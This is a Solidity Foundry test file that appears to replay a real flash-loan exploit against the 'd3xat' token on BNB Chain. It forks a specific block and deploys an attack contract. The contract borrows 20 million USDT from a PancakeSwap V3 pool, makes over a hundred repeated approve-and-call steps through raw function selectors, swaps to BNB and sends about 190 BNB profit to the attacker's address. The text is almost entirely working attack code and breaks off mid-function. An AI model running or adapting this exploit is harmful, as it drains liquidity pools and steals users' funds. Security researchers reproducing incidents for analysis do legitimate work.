
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 57780984;
    uint256 constant TX_TIMESTAMP = 1755333865;
    uint256 constant TX_BLOCK_NUMBER = 57780985;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        D3xAiAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (D3xAiAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = D3xAiAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new D3xAiAttack();
        }
    }

    function _prepareProfit(D3xAiAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(D3xAiAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(D3xAiAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "BNB", 190252041814831167874);
    }
}

contract D3xAiAttack {
    function attack() external payable {
        _startFlashLoan();
    }

    function _startFlashLoan() internal {
        _requestPancakeFlash();
        _approveRouter();
        _queryRouterWbnb();
        _executeSwapPath();
        _settleNativeProfit();
    }

    function _requestPancakeFlash() internal {
        {
            bytes memory flashProof = abi.encode(
                Addresses.TransparentUpgradeableProxy_B8AD82,
                Addresses.d3xat,
                uint256(997770162466318474289021613029666659860419953422),
                uint256(20000000000000000000000000)
            );
            IPancakeV3Pool(Addresses.PancakeV3Pool).flash(address(this), 20000000000000000000000000, 0, flashProof);
        }
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _approveRouter() internal {
        {
            uint256 routerAllowance = 162050884788503640076373;
            IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, routerAllowance);
        }
    }

    function _queryRouterWbnb() internal {
        IPancakeRouter(Addresses.PancakeRouter).WETH();
    }

    function _executeSwapPath() internal {
        {
            uint256 swapAmountIn = 162050884788503640076373;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForETH(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.USDT, Addresses.WBNB),
                        address(this),
                        1755333865
                    );
            }
        }
    }

    function _settleNativeProfit() internal {
        (bool sinkPaid,) = payable(Addresses.A_1266C6_5F20).call{value: 300000000000000000}("");
        sinkPaid;

        uint256 profitAmount = address(this).balance;
        if (profitAmount > 190253117446131167874) profitAmount = 190253117446131167874;
        (bool profitPaid,) = payable(Addresses.attacker_eoa).call{value: profitAmount}("");
        profitPaid;
    }

    function flashCallback() internal {
        _replayDone[FLASH_CALLBACK_DONE] = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
        flashCallback16();
        flashCallback17();
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
        flashCallback23();
        flashCallback24();
        flashCallback25();
        flashCallback26();
        flashCallback27();
        flashCallback28();
        flashCallback29();
        flashCallback30();
        flashCallback31();
        flashCallback32();
        flashCallback33();
        flashCallback34();
        flashCallback35();
        flashCallback36();
        flashCallback37();
        flashCallback38();
        flashCallback39();
        flashCallback40();
        flashCallback41();
        flashCallback42();
        flashCallback43();
        flashCallback44();
        flashCallback45();
        flashCallback46();
        flashCallback47();
        flashCallback48();
        flashCallback49();
        flashCallback50();
        flashCallback51();
        flashCallback52();
        flashCallback53();
        flashCallback54();
        flashCallback55();
        flashCallback56();
        flashCallback57();
        flashCallback58();
        flashCallback59();
        flashCallback60();
        flashCallback61();
        flashCallback62();
        flashCallback63();
        flashCallback64();
        flashCallback65();
        flashCallback66();
        flashCallback67();
        flashCallback68();
        flashCallback69();
        flashCallback70();
        flashCallback71();
        flashCallback72();
        flashCallback73();
        flashCallback74();
        flashCallback75();
        flashCallback76();
        flashCallback77();
        flashCallback78();
        flashCallback79();
        flashCallback80();
        flashCallback81();
        flashCallback82();
        flashCallback83();
        flashCallback84();
        flashCallback85();
        flashCallback86();
        flashCallback87();
        flashCallback88();
        flashCallback89();
        flashCallback90();
        flashCallback91();
        flashCallback92();
        flashCallback93();
        flashCallback94();
        flashCallback95();
        flashCallback96();
        flashCallback97();
        flashCallback98();
        flashCallback99();
        flashCallback100();
        flashCallback101();
        flashCallback102();
        flashCallback103();
        flashCallback104();
        flashCallback105();
        flashCallback106();
        flashCallback107();
        flashCallback108();
        flashCallback109();
        flashCallback110();
        flashCallback111();
        flashCallback112();
        flashCallback113();
        flashCallback114();
        flashCallback115();
        flashCallback116();
        flashCallback117();
        flashCallback118();
        flashCallback119();
        flashCallback120();
        flashCallback121();
        flashCallback122();
        flashCallback123();
        flashCallback124();
        flashCallback125();
        flashCallback126();
        flashCallback127();
        flashCallback128();
        flashCallback129();
        flashCallback130();
        flashCallback131();
        flashCallback132();
        flashCallback133();
        flashCallback134();
        flashCallback135();
        flashCallback136();
        flashCallback137();
        flashCallback138();
        flashCallback139();
        flashCallback140();
        flashCallback141();
        flashCallback142();
        flashCallback143();
        flashCallback144();
        flashCallback145();
        flashCallback146();
        flashCallback147();
        flashCallback148();
        flashCallback149();
        flashCallback150();
        flashCallback151();
        flashCallback152();
        flashCallback153();
        flashCallback154();
        flashCallback155();
        flashCallback156();
        flashCallback157();
        flashCallback158();
        flashCallback159();
        flashCallback160();
        flashCallback161();
        flashCallback162();
        flashCallback163();
        flashCallback164();
        flashCallback165();
        flashCallback166();
        flashCallback167();
        flashCallback168();
        flashCallback169();
        flashCallback170();
        flashCallback171();
        flashCallback172();
        flashCallback173();
        flashCallback174();
        flashCallback175();
        flashCallback176();
        flashCallback177();
        flashCallback178();
        flashCallback179();
        flashCallback180();
        flashCallback181();
        flashCallback182();
        flashCallback183();
        flashCallback184();
        flashCallback185();
        flashCallback186();
        flashCallback187();
        flashCallback188();
        flashCallback189();
        flashCallback190();
        flashCallback191();
        flashCallback192();
        flashCallback193();
        flashCallback194();
        flashCallback195();
        flashCallback196();
        flashCallback197();
        flashCallback198();
        flashCallback199();
        flashCallback200();
        flashCallback201();
        flashCallback202();
        flashCallback203();
        flashCallback204();
        flashCallback205();
    }

    function flashCallback2() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9000000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback3() internal {
        ITransparentUpgradeableProxy_B8AD82(Addresses.TransparentUpgradeableProxy_B8AD82)
            .getAmountOut(Addresses.USDT, Addresses.d3xat, 12313575093686077974655);
    }

    function flashCallback4() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.A_CAC261_0CBA, 12313575093686077974655);
    }

    function flashCallback5() internal {
        {
            (bool ok,) = Addresses.A_CAC261_0CBA
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xe09618e9),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_4D85F6_225F,
                        12313575093686077974655
                    )
                );
            require(ok, "selector 0xe09618e9 failed");
        }
    }

    function flashCallback6() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.A_6AC39F_EBC7, 12313575093686077974655);
    }

    function flashCallback7() internal {
        {
            (bool ok,) = Addresses.A_6AC39F_EBC7
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xe09618e9),
                        Addresses.TransparentUpgradeableProxy_B8AD82,
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_232962_D280,
                        12313575093686077974655
                    )
                );
            require(ok, "selector 0xe09618e9 failed");
        }
    }

    function flashCallback8() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback9() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback10() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback11() internal {
        {
            uint256 usdtApproveAllowance = 13593403807467506211743;
            IERC20Like(Addresses.USDT).approve(Addresses.A_8DBC02_78A8, usdtApproveAllowance);
        }
    }

    function flashCallback12() internal {
        {
            (bool ok,) = Addresses.A_8DBC02_78A8
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_FD7D31_C9B5,
                        13593403807467506211743
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback13() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback14() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback15() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback16() internal {
        {
            uint256 usdtApproveAllowance2 = 14708835319117670963614;
            IERC20Like(Addresses.USDT).approve(Addresses.A_E99398_D734, usdtApproveAllowance2);
        }
    }

    function flashCallback17() internal {
        {
            (bool ok,) = Addresses.A_E99398_D734
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_0780A5_BEF4,
                        14708835319117670963614
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback18() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback19() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback20() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback21() internal {
        {
            uint256 usdtApproveAllowance3 = 15967366504674458224507;
            IERC20Like(Addresses.USDT).approve(Addresses.A_7DBB79_FA91, usdtApproveAllowance3);
        }
    }

    function flashCallback22() internal {
        {
            (bool ok,) = Addresses.A_7DBB79_FA91
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_F3F050_4730,
                        15967366504674458224507
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback23() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback24() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback25() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback26() internal {
        {
            uint256 usdtApproveAllowance4 = 17394562440081592570057;
            IERC20Like(Addresses.USDT).approve(Addresses.A_070E38_1EFD, usdtApproveAllowance4);
        }
    }

    function flashCallback27() internal {
        {
            (bool ok,) = Addresses.A_070E38_1EFD
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_3FB468_8962,
                        17394562440081592570057
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback28() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback29() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback30() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback31() internal {
        {
            uint256 usdtApproveAllowance5 = 19021963255709054927532;
            IERC20Like(Addresses.USDT).approve(Addresses.A_A42BF9_5DAD, usdtApproveAllowance5);
        }
    }

    function flashCallback32() internal {
        {
            (bool ok,) = Addresses.A_A42BF9_5DAD
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_BE02EF_8A5D,
                        19021963255709054927532
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback33() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback34() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback35() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback36() internal {
        {
            uint256 usdtApproveAllowance6 = 20888841903544551297204;
            IERC20Like(Addresses.USDT).approve(Addresses.A_58EDE5_761D, usdtApproveAllowance6);
        }
    }

    function flashCallback37() internal {
        {
            (bool ok,) = Addresses.A_58EDE5_761D
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_03841C_E9C3,
                        20888841903544551297204
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback38() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback39() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback40() internal {
        {
            uint256 usdtApproveAllowance7 = 23044596269921069938251;
            IERC20Like(Addresses.USDT).approve(Addresses.A_C5A630_4026, usdtApproveAllowance7);
        }
    }

    function flashCallback41() internal {
        {
            (bool ok,) = Addresses.A_C5A630_4026
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_E72D1A_F826,
                        23044596269921069938251
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback42() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback43() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback44() internal {
        {
            uint256 usdtApproveAllowance8 = 25552051464164976710749;
            IERC20Like(Addresses.USDT).approve(Addresses.A_340411_C35E, usdtApproveAllowance8);
        }
    }

    function flashCallback45() internal {
        {
            (bool ok,) = Addresses.A_340411_C35E
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_B81B26_8808,
                        25552051464164976710749
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback46() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback47() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback48() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback49() internal {
        {
            uint256 usdtApproveAllowance9 = 28492090792208405509009;
            IERC20Like(Addresses.USDT).approve(Addresses.A_CD7249_399D, usdtApproveAllowance9);
        }
    }

    function flashCallback50() internal {
        {
            (bool ok,) = Addresses.A_CD7249_399D
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_ECA749_2D8B,
                        28492090792208405509009
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback51() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback52() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback53() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback54() internal {
        {
            uint256 usdtApproveAllowance10 = 31970263603179899104600;
            IERC20Like(Addresses.USDT).approve(Addresses.A_414ABF_8928, usdtApproveAllowance10);
        }
    }

    function flashCallback55() internal {
        {
            (bool ok,) = Addresses.A_414ABF_8928
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_851BAB_3BA8,
                        31970263603179899104600
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback56() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback57() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback58() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback59() internal {
        {
            uint256 usdtApproveAllowance11 = 36126397017779265792363;
            IERC20Like(Addresses.USDT).approve(Addresses.A_E12B2E_2414, usdtApproveAllowance11);
        }
    }

    function flashCallback60() internal {
        {
            (bool ok,) = Addresses.A_E12B2E_2414
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_0E01BD_7B4A,
                        36126397017779265792363
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback61() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback62() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback63() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback64() internal {
        {
            uint256 usdtApproveAllowance12 = 41148880432760094805242;
            IERC20Like(Addresses.USDT).approve(Addresses.A_0EE029_8D6C, usdtApproveAllowance12);
        }
    }

    function flashCallback65() internal {
        {
            (bool ok,) = Addresses.A_0EE029_8D6C
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_EBEF15_3247,
                        41148880432760094805242
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback66() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback67() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback68() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback69() internal {
        {
            uint256 usdtApproveAllowance13 = 47296412581137062456383;
            IERC20Like(Addresses.USDT).approve(Addresses.A_0E3689_4472, usdtApproveAllowance13);
        }
    }

    function flashCallback70() internal {
        {
            (bool ok,) = Addresses.A_0E3689_4472
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_FAE1CC_C251,
                        47296412581137062456383
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback71() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback72() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback73() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback74() internal {
        {
            uint256 usdtApproveAllowance14 = 54932025695228696606546;
            IERC20Like(Addresses.USDT).approve(Addresses.A_9CF7A4_83BD, usdtApproveAllowance14);
        }
    }

    function flashCallback75() internal {
        {
            (bool ok,) = Addresses.A_9CF7A4_83BD
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_2599E0_B261,
                        54932025695228696606546
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback76() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback77() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback78() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback79() internal {
        {
            uint256 usdtApproveAllowance15 = 64578002036942282012117;
            IERC20Like(Addresses.USDT).approve(Addresses.A_BBF92A_2EC2, usdtApproveAllowance15);
        }
    }

    function flashCallback80() internal {
        {
            (bool ok,) = Addresses.A_BBF92A_2EC2
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_79369E_31CB,
                        64578002036942282012117
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback81() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback82() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback83() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback84() internal {
        {
            uint256 usdtApproveAllowance16 = 77007752859380889089402;
            IERC20Like(Addresses.USDT).approve(Addresses.A_707FD2_579A, usdtApproveAllowance16);
        }
    }

    function flashCallback85() internal {
        {
            (bool ok,) = Addresses.A_707FD2_579A
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_8CEFAC_BBCC,
                        77007752859380889089402
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback86() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback87() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback88() internal {
        {
            uint256 usdtApproveAllowance17 = 93406114001368603065231;
            IERC20Like(Addresses.USDT).approve(Addresses.A_9C3E9F_6704, usdtApproveAllowance17);
        }
    }

    function flashCallback89() internal {
        {
            (bool ok,) = Addresses.A_9C3E9F_6704
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_B06011_05AB,
                        93406114001368603065231
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback90() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback91() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback92() internal {
        {
            uint256 usdtApproveAllowance18 = 115663206997609024769928;
            IERC20Like(Addresses.USDT).approve(Addresses.A_520588_9BE6, usdtApproveAllowance18);
        }
    }

    function flashCallback93() internal {
        {
            (bool ok,) = Addresses.A_520588_9BE6
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_0E0CB7_64C6,
                        115663206997609024769928
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback94() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback95() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback96() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback97() internal {
        {
            uint256 usdtApproveAllowance19 = 146946230057637948539027;
            IERC20Like(Addresses.USDT).approve(Addresses.A_97DFFD_D1C7, usdtApproveAllowance19);
        }
    }

    function flashCallback98() internal {
        {
            (bool ok,) = Addresses.A_97DFFD_D1C7
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_6D6327_F6F8,
                        146946230057637948539027
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback99() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback100() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback101() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback102() internal {
        {
            uint256 usdtApproveAllowance20 = 192896488580998216836983;
            IERC20Like(Addresses.USDT).approve(Addresses.A_EE3115_5823, usdtApproveAllowance20);
        }
    }

    function flashCallback103() internal {
        {
            (bool ok,) = Addresses.A_EE3115_5823
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_FF5879_AEC6,
                        192896488580998216836983
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback104() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback105() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback106() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback107() internal {
        {
            uint256 usdtApproveAllowance21 = 264377567909709320837859;
            IERC20Like(Addresses.USDT).approve(Addresses.A_F1126A_AE1C, usdtApproveAllowance21);
        }
    }

    function flashCallback108() internal {
        {
            (bool ok,) = Addresses.A_F1126A_AE1C
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_F314F5_1113,
                        264377567909709320837859
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback109() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback110() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback111() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback112() internal {
        {
            uint256 usdtApproveAllowance22 = 384593293717583760964680;
            IERC20Like(Addresses.USDT).approve(Addresses.A_7AC51F_5401, usdtApproveAllowance22);
        }
    }

    function flashCallback113() internal {
        {
            (bool ok,) = Addresses.A_7AC51F_5401
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_551E6E_39E4,
                        384593293717583760964680
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback114() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback115() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback116() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback117() internal {
        {
            uint256 usdtApproveAllowance23 = 610848777860901552392120;
            IERC20Like(Addresses.USDT).approve(Addresses.A_5C8710_3156, usdtApproveAllowance23);
        }
    }

    function flashCallback118() internal {
        {
            (bool ok,) = Addresses.A_5C8710_3156
                .call(
                    abi.encodeWithSelector(
                        bytes4(0xacfca76f),
                        Addresses.USDT,
                        Addresses.d3xat,
                        Addresses.A_2ED5B0_042D,
                        610848777860901552392120
                    )
                );
            require(ok, "selector 0xacfca76f failed");
        }
    }

    function flashCallback119() internal {
        IERC20Like(Addresses.d3xat).balanceOf(Addresses.Cake_LP_C30E);
    }

    function flashCallback120() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(9900000000000000000000, _addressArray2(Addresses.USDT, Addresses.d3xat));
    }

    function flashCallback121() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback122() internal {
        {
            uint256 usdtApproveAllowance24 = 1119700963539231411211351;
            IERC20Like(Addresses.USDT).approve(Addresses.A_A94929_57FE, usdtApproveAllowance24);
        }
    }

    function flashCallback123() internal {
        {
